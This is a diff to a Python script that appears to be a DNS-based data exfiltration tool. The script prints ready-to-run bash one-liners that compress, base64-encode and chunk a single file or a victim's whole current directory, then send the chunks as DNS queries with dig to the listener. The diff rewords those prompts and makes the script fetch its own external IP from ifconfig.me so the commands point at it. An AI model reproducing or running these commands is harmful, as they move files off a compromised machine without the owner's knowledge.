@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
 import socket
+import urllib.request
 import sys
 import time
 import hashlib
@@ -140,7 +141,6 @@ def usage(str=""):
         f"{sys.argv[0]} 127.0.0.1 -z -s 4 -b 63 -f  1\t4 subdomains, 63 bytes => (62 * 4 = 248 bytes) + (4 * '.' = 252). Filename =>  1 byte(s)"
     )
     print("\n")
-    print(str)
 
 
 def p_cmds(s, b, ip, z):
@@ -150,20 +150,20 @@ def p_cmds(s, b, ip, z):
     print("\n")
 
     if z:
-        print("[?] Copy individual file (ZIP enabled)")
+        print("[?] Copy an individual file, i.e file.txt (ZIP enabled)")
         print(
             f"""{RED}\x23{RESET} f=file.txt; s={s};b={b};c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\\{{$b\\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne $r$f|tr "+" "*"` +short; done\n"""
         )
-        print("[?] Copy entire folder (ZIP enabled)")
+        print("[?] Copy the clients entire current directory (ZIP enabled)")
         print(
             f"""{RED}\x23{RESET} for f in $(ls .); do s={s};b={b};c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\\{{$b\\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne $r$f|tr "+" "*"` +short; done ; done\n"""
         )
     else:
-        print("[?] Copy individual file")
+        print("[?] Copy an individual file, i.e file.txt")
         print(
             f"""{RED}\x23{RESET} f=file.txt; s={s};b={b};c=0; for r in $(for i in $(base64 -w0 $f| sed "s/.\\{{$b\\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne $r$f|tr "+" "*"` +short; done\n"""
         )
-        print("[?] Copy entire folder")
+        print("[?] Copy the clients current directory")
         print(
             f"""{RED}\x23{RESET} for f in $(ls .); do s={s};b={b};c=0; for r in $(for i in $(base64 -w0 $f | sed "s/.\\{{$b\\}}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @{ip} `echo -ne $r$f|tr "+" "*"` +short; done ; done\n"""
         )
@@ -237,7 +237,8 @@ if __name__ == "__main__":
         sys.exit(1)
 
     print(f"[+] DNS listening on {ip}:{port}")
-    p_cmds(s, b, ip, z)
+    external_ip = urllib.request.urlopen("https://ifconfig.me").read().decode("utf-8")
+    p_cmds(s, b, external_ip, z)
     print("[+] Once files have sent, use Ctrl+C to exit and save.\n")
 
     try:
